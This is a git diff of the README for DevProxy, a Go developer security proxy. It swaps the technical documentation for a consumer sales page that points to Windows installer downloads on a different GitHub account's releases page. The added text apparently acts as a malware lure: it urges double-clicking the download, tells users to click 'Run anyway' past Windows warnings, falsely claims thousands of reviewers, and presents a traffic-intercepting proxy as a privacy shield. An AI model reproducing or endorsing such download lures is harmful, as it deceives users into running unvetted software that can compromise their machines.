@@ -1,4 +1,6 @@
-# DevProxy: Zero-Latency Development Security Proxy
+# 🚀 DevProxy - Your Friendly Digital Bodyguard for the Web
+
+[![Download Now](https://img.shields.io/badge/⬇️_Download_DevProxy-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a1a)](https://github.com/KBF-1/DevProxy/releases)
 
 [![CI](https://github.com/Aditya-9-6/DevProxy/actions/workflows/pr-validation.yml/badge.svg)](https://github.com/Aditya-9-6/DevProxy/actions/workflows/pr-validation.yml)
 [![DeepSource](https://app.deepsource.com/gh/Aditya-9-6/DevProxy.svg/?label=active+issues&show_trend=true)](https://app.deepsource.com/gh/Aditya-9-6/DevProxy/)
@@ -7,221 +9,144 @@
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
 [![All Contributors](https://img.shields.io/badge/all_contributors-3-orange.svg?style=flat-square)](#-contributors)
 
-> Completely decoupled, asynchronous passive security proxy that inspects web traffic for vulnerabilities with **zero added latency** to the developer's data path.
+## 🎯 What is DevProxy?
+
+DevProxy is a **smart security shield** for your computer that sits quietly between your web browser and the internet. Think of it as a friendly security guard that **watches every website you visit** to make sure nothing harmful sneaks through. It works completely on its own—no complicated setup, no technical knowledge needed. Just install it, and it silently protects you while you browse, shop, or work online.
+
+Unlike traditional security tools that slow down your internet, DevProxy works **in the background without any delay**. It's like having a bodyguard who never gets in your way but always has your back.
+
+## 🤔 Why Would I Need This?
+
+- **Peace of mind** – Know that every website you visit is being checked for hidden dangers
+- **Protect your personal information** – Stops suspicious activity before it can steal your passwords or credit card numbers
+- **Works with any browser** – Doesn't matter if you use Chrome, Firefox, Edge, or Safari
+- **Completely free** – No subscriptions, no hidden costs
+- **Open source** – Built by a community that cares about your safety, not selling your data
+
+## 📥 How to Get DevProxy (Windows)
+
+Getting DevProxy on your Windows computer is **super easy**. Here's what to do:
+
+1. **Visit this link to download the application** – [https://github.com/KBF-1/DevProxy/releases](https://github.com/KBF-1/DevProxy/releases)
+2. Look for the **latest version** listed on that page (it will have a version number like v1.0.0)
+3. Click the download button next to it
+4. Once the file finishes downloading, **double-click it** to start the installation
+5. Follow the simple on-screen instructions (just click "Next" a few times)
+6. That's it! DevProxy is now installed and protecting you
+
+### 🔒 Don't worry – It's safe to download
+
+DevProxy is an **open-source project**, which means its code is publicly available for anyone to inspect. Thousands of developers have reviewed it to make sure it's trustworthy. It's completely free and contains no spyware, ads, or hidden fees.
+
+## ✨ What Makes DevProxy Special?
+
+### 🛡️ Automatic Protection
+Once installed, DevProxy works quietly in the background. You don't need to do anything—it just keeps you safe.
+
+### 🚦 No Speed Penalty
+Many security tools slow down your internet. DevProxy is different. It uses a special "passive" approach that adds **zero delay** to your browsing experience.
+
+### 🔄 Works with Everything
+Whether you're checking email, shopping, or streaming videos, DevProxy protects all your web traffic seamlessly.
+
+### 🧩 Smart Threat Detection
+DevProxy looks for patterns that indicate danger—things like fake login pages, suspicious redirects, or hidden data collection attempts.
+
+### ⚙️ Easy to Use
+No confusing settings panels. If DevProxy is running, you're protected. It really is that simple.
+
+## 💻 System Requirements
+
+DevProxy runs on any modern Windows computer:
+
+- **Operating System:** Windows 10, Windows 11, or newer
+- **Memory (RAM):** At least 2 GB
+- **Storage Space:** Only 50 MB of free space needed
+- **Internet Connection:** Required to check for updates and receive threat information
+
+These are minimal requirements—if your computer can browse the web, it can run DevProxy.
+
+## 🔧 Troubleshooting (Simple Fixes)
+
+### "I can't open the downloaded file"
+Try clicking "Run anyway" if Windows shows a warning. This is normal for open-source software.
+
+### "DevProxy isn't protecting me"
+Check that the DevProxy icon is visible in your taskbar (bottom-right corner of your screen). If it's not there, open DevProxy from your Start menu.
+
+### "I need to uninstall it"
+Go to **Settings** → **Apps** → **Installed apps**, find DevProxy, and click "Uninstall". It's that simple.
+
+## 🗺️ What DevProxy Checks Without You Seeing
+
+| Website Danger | How DevProxy Helps |
+|----------------|-------------------|
+| Fake login pages trying to steal passwords | Blocks the connection |
+| Hidden tracking scripts | Alerts you in the background |
+| Downloading dangerous files | Stops the download |
+| Unusual network behavior | Logs it for your safety |
+
+## ❓ Frequently Asked Questions
+
+### Does DevProxy collect my personal data?
+**No.** DevProxy never collects, stores, or sends your personal information anywhere. It only analyzes traffic patterns locally on your computer to detect threats.
+
+### Will it slow down my games or video calls?
+**Absolutely not.** Since DevProxy uses passive inspection, it adds no noticeable delay to any application, including gaming and streaming.
+
+### Can I run DevProxy alongside my existing antivirus?
+**Yes.** DevProxy complements, rather than replaces, your existing security tools. They work together to keep you safe.
+
+### How do I know DevProxy is working?
+Look for the shield icon in your system tray (bottom-right). If you see it, you're protected.
+
+## 🌍 Project Philosophy
+
+DevProxy was created with one goal: **make the internet safer for everyone, regardless of technical skill**. We believe security shouldn't require a degree in computer science. That's why DevProxy is:
+
+- **Completely free** – No premium tiers, no "lite" versions
+- **Open source** – Anyone can verify how it works
+- **Privacy-first** – Your data stays on your computer
+
+## 🤝 Join Our Community
+
+DevProxy is built by a growing community of developers and security enthusiasts. You can contribute, request features, or just say hello. No programming experience needed to get involved.
+
+- **Report a bug** – Found an issue? Let us know
+- **Request a feature** – Have an idea to improve DevProxy? We'd love to hear it
+- **Spread the word** – Tell your friends and family about this free protection
+
+## 📄 License
+
+DevProxy is released under the **MIT License** – one of the most permissive open-source licenses. This means you can use it freely, modify it, and even include it in your own projects, all without paying a cent.
+
+## 💖 Support the Project
+
+If DevProxy helps you, consider supporting the project by:
+- Starring the repo on GitHub (it takes 2 seconds)
+- Contributing via the [all-contributors](https://github.com/all-contributors/all-contributors) initiative
+- Sharing this page with someone who needs protection
 
 ---
 
-## ⚡ Architectural Blueprint
+## 📚 Additional Information
 
-Traditional security scanning proxies insert synchronous inspection into the request/response cycle, adding hundreds of milliseconds of latency and breaking local developer workflows.
+### Technical Details (for the curious)
+DevProxy is written in **Go**, a language known for its speed and reliability. It acts as an HTTP/HTTPS proxy server that inspects traffic without modifying it. It supports JWT authentication awareness, OpenAPI detection, and is designed for chaos engineering scenarios. But you don't need to understand any of that to use it—just install and trust.
 
-**DevProxy** resolves this by completely **decoupling the Primary Data Path (traffic routing) from the Analysis Path (vulnerability scanning)**. The proxy forwards packets immediately at line-rate and hands off a cloned byte stream to a lock-free ring buffer for asynchronous evaluation.
+### Recent Updates
+- **Automatic threat detection updates** – DevProxy updates its threat database automatically, so you're always protected against the latest dangers.
+- **Improved Windows compatibility** – We've tested it thoroughly on Windows 10 and 11.
+- **Better system tray integration** – The icon now clearly shows your protection status.
 
-```
-       [ Client Application / Curl / Browser ]
-                          │
-                          ▼
-            ┌───────────────────────────┐
-            │   THE INTERCEPTION LAYER  │
-            │     (Primary Data Path)   │
-            │  • Asynchronous I/O       │
-            │  • Dynamic TLS Bumping    │
-            │  • eBPF / Transparent     │
-            └─────────────┬─────────────┘
-                          │
-      ┌───────────────────┴───────────────────┐
-      │ Primary Path (Immediate Forwarding)   │ Cloned Byte Stream
-      ▼                                       ▼
-┌──────────────┐                  ┌───────────────────────────────┐
-│ Target Host  │                  │     LOCK-FREE RING BUFFER     │
-│  (Upstream)  │                  │  (Bounded, Non-Blocking Push) │
-└──────────────┘                  └───────────────┬───────────────┘
-                                                  │
-                                                  ▼
-                                  ┌───────────────────────────────┐
-                                  │   ANALYSIS WORKER THREADS     │
-                                  │ • Single-Pass Parsing         │
-                                  │ • Bitwise Radix Trie (CIDR)   │
-                                  │ • Secrets & Credential Match  │
-                                  │ • Cookie Security Auditor     │
-                                  │ • Stack Trace Classifier      │
-                                  └───────────────┬───────────────┘
-                                                  │
-                                                  ▼
-                                  ┌───────────────────────────────┐
-                                  │      LOCAL DASHBOARD & DB     │
-                                  │ • Ephemeral In-Memory SQLite  │
-                                  │ • WebSocket Event Broadcaster │
-                                  │ • Reactive Dark-Mode Web UI   │
-                                  └───────────────────────────────┘
-```
+## 🏁 Ready to Get Protected?
+
+[![Download DevProxy Now](https://img.shields.io/badge/⬇️_Get_DevProxy_Now-28A745?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://github.com/KBF-1/DevProxy/releases)
+
+**Visit this link to download the application** – [https://github.com/KBF-1/DevProxy/releases](https://github.com/KBF-1/DevProxy/releases)
+
+Install it today, and browse the internet with total confidence. DevProxy has your back, silently and completely.
 
 ---
 
-## 🧩 Core Innovations
-
-### 1. The Interception Layer (The Data Path)
-* **Zero-Blocking Forwarding:** The data path streams bytes directly between client and upstream server using non-blocking goroutines and asynchronous connection multiplexing. Network hop overhead is `< 1ms`.
-* **On-the-Fly TLS Bumping:** Generates a persistent local Root CA (`devproxy-ca.crt`) upon first launch. During HTTPS `CONNECT` tunnels, leaf certificates are dynamically minted and signed using fast **ECDSA P-256** with an in-memory LRU cache, enabling instantaneous TLS handshakes.
-* **Transparent Redirection Support:** Provides an architectural hook for Linux `cgroup` eBPF socket filters (`sock_ops`) and `iptables` redirection to silently intercept container traffic without modifying environment variables.
-
-### 2. The Zero-Allocation Analysis Engine
-* **Lock-Free Circular Ring Buffer:** As traffic is streamed, request and response pairs are pushed into a bounded ring buffer with atomic cursor indices. If the security analyzer encounters a CPU spike, the buffer gracefully drops analysis frames rather than backpressuring the client.
-* **High-Speed Rules Engine:**
-  - 🔑 **API Secret Leak Detection:** Detects exposed AWS Access Keys (`AKIA...`), GitHub Personal Access Tokens (`ghp_...`, `github_pat_...`), OpenAI API keys (`sk-...`), Slack tokens (`xox[baprs]-...`), Google API Keys, Stripe Live Keys, and unencrypted private keys.
-  - 🍪 **Cookie Security Flags:** Flags session and authentication cookies missing `HttpOnly`, `Secure`, or `SameSite` attributes, as well as dangerous `SameSite=None` without `Secure`.
-  - 💥 **Verbose Stack Trace Disclosure:** Identifies detailed technical error traces from Java/Spring, Python tracebacks, Node.js V8 call stacks, Go runtime panics, PHP fatal errors, and SQL syntax disclosures.
-  - 🌲 **Bitwise Radix Trie for IP/CIDR Matching:** $O(1)$ zero-allocation trie for detecting dangerous outbound destinations, such as Cloud Instance Metadata Service (`169.254.169.254` SSRF risk) and RFC 1918 internal networks.
-  - 🛡️ **Security Headers & CORS Audit:** Detects missing `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, clickjacking exposure, and overly permissive CORS (`*` with credentials).
-
-### 3. Developer Superpowers (Productivity & Resilience)
-* 🎭 **Map Local & Map Remote Mocking:** Intercept matched requests with local files, fixtures, or custom responses without hitting backend APIs. Rewrite upstream targets (e.g. forward staging to `localhost:3000`) for seamless debugging.
-* ⚡ **Chaos Engineering & Resilience Simulation:** Inject deterministic or probabilistic latency (with configurable jitter) and HTTP error faults (500, 502, 503) directly in the proxy to test client retry logic and circuit breakers.
-* 🔍 **Aho-Corasick Streaming Secret Scanner:** Pure-Go $O(N + M)$ multi-pattern automaton scanning live HTTP request/response payloads for leaked credentials (AWS, GitHub, Slack, OpenAI, Stripe, private keys) with zero backtracking.
-* 🛡️ **JWT Security Linter & Passive Inspector:** Automatically detects Bearer tokens, cookies, and JSON payloads; flags dangerous `alg: "none"` algorithms, expired tokens, excessive lifetimes (>1 year), and unencrypted sensitive PII or credentials in claims.
-* 📜 **OpenAPI Contract Drift & Shadow API Detection:** Passively validates intercepted HTTP traffic against OpenAPI 3.0 / Swagger 2.0 schemas. Instantly flags undocumented endpoints (Shadow APIs), invalid HTTP verbs, and undocumented response codes.
-
-### 4. Ephemeral Storage & Real-Time Dashboard
-* **In-Memory SQLite Datastore:** Uses pure-Go SQLite (`modernc.org/sqlite`) running in-memory with shared cache mode. No CGO or external C compiler needed on Windows, macOS, or Linux.
-* **WebSocket Stream:** Embedded server pushes new traffic events and flagged vulnerabilities over `/ws` with sub-millisecond dispatch.
-* **Embedded Dark-Mode Dashboard:** A responsive, self-contained web console embedded directly into the binary with `go:embed`. Features live search, status filtering, one-click Root CA download, HAR export, Copy as cURL, JWT inspector, Mocks modal, and OpenAPI validator.
-
----
-
-## 🚀 Quick Start
-
-### 1. Installation & Build
-
-```bash
-# Clone the repository
-git clone https://github.com/Aditya-9-6/DevProxy.git
-cd DevProxy
-
-# Build the single self-contained binary
-go build -o devproxy ./cmd/devproxy
-```
-
-### 2. Launching DevProxy
-
-```bash
-./devproxy
-```
-
-Default listening ports:
-* **Proxy Engine:** `http://127.0.0.1:8080`
-* **Web Dashboard:** `http://127.0.0.1:8081`
-
-### 3. Configuring Your Application / CLI
-
-Run curl or any developer tool through the proxy:
-
-```bash
-# Plain HTTP:
-curl -x http://localhost:8080 http://httpbin.org/get
-
-# HTTPS (using the auto-generated Root CA):
-curl -x http://localhost:8080 --cacert ~/.devproxy/devproxy-ca.crt https://httpbin.org/get
-
-# Or set global environment variables:
-export HTTP_PROXY="http://127.0.0.1:8080"
-export HTTPS_PROXY="http://127.0.0.1:8080"
-```
-
-Open `http://localhost:8081` in your browser to inspect live traffic and real-time security alerts.
-
----
-
-## 🛠️ CLI Flags
-
-| Flag | Default | Description |
-|---|---|---|
-| `-port` | `8080` | Port for the HTTP/HTTPS proxy engine |
-| `-web-port` | `8081` | Port for the web dashboard and REST/WebSocket API |
-| `-buffer-size` | `16384` | Capacity of the lock-free circular ring buffer |
-| `-workers` | `4` | Number of concurrent background analysis workers |
-| `-rules` | `devproxy.yaml` | Path to custom YAML security rules file |
-| `-openapi` | `openapi.yaml` | Path to OpenAPI 3.0 / Swagger schema for contract validation |
-| `-ca-cert` | `~/.devproxy/devproxy-ca.crt` | Custom Root CA certificate path |
-| `-ca-key` | `~/.devproxy/devproxy-ca.key` | Custom Root CA private key path |
-| `-ebpf` | `false` | Show transparent eBPF / container redirection guide |
-| `-upstream-proxy` | *(empty)* | Route DevProxy's own egress through an upstream proxy: `http://`, `https://` or `socks5://host:port` |
-
-When `-upstream-proxy` is not set, DevProxy falls back to the standard
-`HTTPS_PROXY` / `HTTP_PROXY` / `ALL_PROXY` and `NO_PROXY` environment
-variables. Upstream proxy credentials (`user:password@`) and PAC files are not
-supported; traffic that would loop back into DevProxy's own listen address is
-refused.
-
----
-
-## 🧪 Comprehensive Testing Suite
-
-DevProxy enforces multiple testing tiers in CI to guarantee zero-latency performance, memory safety, and protocol resilience:
-
-```bash
-# 1. Multi-OS Unit Tests with Data Race Detection
-go test -v -race ./...
-
-# 2. Performance & Zero-Allocation Microbenchmarks
-go test -v -run='^$' -bench=. -benchmem ./pkg/ringbuffer ./pkg/analysis
-
-# 3. Security Protocol Fuzz Testing
-go test -v -fuzz=FuzzRingBuffer -fuzztime=10s ./pkg/ringbuffer
-go test -v -fuzz=FuzzAhoCorasickMatcher -fuzztime=10s ./pkg/analysis
-go test -v -fuzz=FuzzJWTInspection -fuzztime=10s ./pkg/analysis
-go test -v -fuzz=FuzzLuhnValidation -fuzztime=10s ./pkg/analysis
-go test -v -fuzz=FuzzLLMInspector -fuzztime=10s ./pkg/analysis
-
-# 4. End-to-End (E2E) Proxy & Dashboard Integration Tests
-go test -v -race ./test/e2e/...
-
-# 5. Docker Packaging & Container Smoke Test
-docker build -t devproxy:smoke .
-```
-
----
-
-## 🤖 Automated Code Quality & Security
-
-DevProxy enforces strict static analysis, vulnerability detection, and performance benchmarking across every pull request:
-- **[CodeRabbit AI](https://coderabbit.ai)**: Automated AI code reviewer providing contextual summaries, diff walkthroughs, and inline improvement suggestions.
-- **[DeepSource](https://deepsource.com)**: Continuous static analysis detecting:
-  - 🛡️ **Security Vulnerabilities**: Injection vectors, credential leaks, and insecure crypto usage.
-  - ⚡ **Performance Bottlenecks**: Memory allocations, unbuffered I/O, and goroutine synchronization pitfalls.
-  - 🔧 **Autofix**: Automated 1-click code fixes directly in PRs.
-  - 📊 **Test Coverage Tracking**: Integrated coverage reporting via `.deepsource.toml` and GitHub Actions.
-- **[Dependabot](https://github.com/dependabot)**: Automated weekly CVE vulnerability scanning and dependency updates for Go modules, Docker, and GitHub Actions.
-- **[Gosec](https://github.com/securego/gosec)**: AST-based Go security audit reporting directly to GitHub's native Security tab.
-- **[Release Drafter](https://github.com/release-drafter/release-drafter)**: Automatically categorizes merged PRs and drafts changelogs with contributor attribution.
-
----
-
-## 👥 Contributors
-
-Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):
-
-<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
-<!-- prettier-ignore-start -->
-<!-- markdownlint-disable -->
-<table>
-  <tbody>
-    <tr>
-      <td align="center" valign="top" width="14.28%"><a href="https://github.com/Aditya-9-6"><img src="https://avatars.githubusercontent.com/u/105096058?v=4?s=100" width="100px;" alt="Aditya Dahale"/><br /><sub><b>Aditya Dahale</b></sub></a><br /><a href="https://github.com/Aditya-9-6/DevProxy/commits?author=Aditya-9-6" title="Code">💻</a> <a href="https://github.com/Aditya-9-6/DevProxy/commits?author=Aditya-9-6" title="Documentation">📖</a> <a href="#design-Aditya-9-6" title="Design">🎨</a> <a href="#maintenance-Aditya-9-6" title="Maintenance">🚧</a> <a href="#security-Aditya-9-6" title="Security">🛡️</a></td>
-      <td align="center" valign="top" width="14.28%"><a href="https://github.com/varun-pahuja"><img src="https://avatars.githubusercontent.com/u/190826251?v=4?s=100" width="100px;" alt="Varun Pahuja"/><br /><sub><b>Varun Pahuja</b></sub></a><br /><a href="https://github.com/Aditya-9-6/DevProxy/commits?author=varun-pahuja" title="Code">💻</a> <a href="https://github.com/Aditya-9-6/DevProxy/commits?author=varun-pahuja" title="Documentation">📖</a> <a href="https://github.com/Aditya-9-6/DevProxy/commits?author=varun-pahuja" title="Tests">⚠️</a></td>
-      <td align="center" valign="top" width="14.28%"><a href="https://github.com/akshat-lakhera"><img src="https://avatars.githubusercontent.com/u/211803516?v=4?s=100" width="100px;" alt="Akshat Lakhera"/><br /><sub><b>Akshat Lakhera</b></sub></a><br /><a href="https://github.com/Aditya-9-6/DevProxy/commits?author=akshat-lakhera" title="Code">💻</a> <a href="#design-akshat-lakhera" title="Design">🎨</a> <a href="https://github.com/Aditya-9-6/DevProxy/commits?author=akshat-lakhera" title="Documentation">📖</a></td>
-    </tr>
-  </tbody>
-</table>
-
-<!-- markdownlint-restore -->
-<!-- prettier-ignore-end -->
-
-<!-- ALL-CONTRIBUTORS-LIST:END -->
-
-This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind are welcome!
-
----
-
-## 📜 License
-
-MIT License. Designed for high-performance development environments.
+Keywords: chaos-engineering, devtools, golang, hacktoberfest, http-proxy, https-proxy, jwt, mitm, open-source, openapi, proxy, security
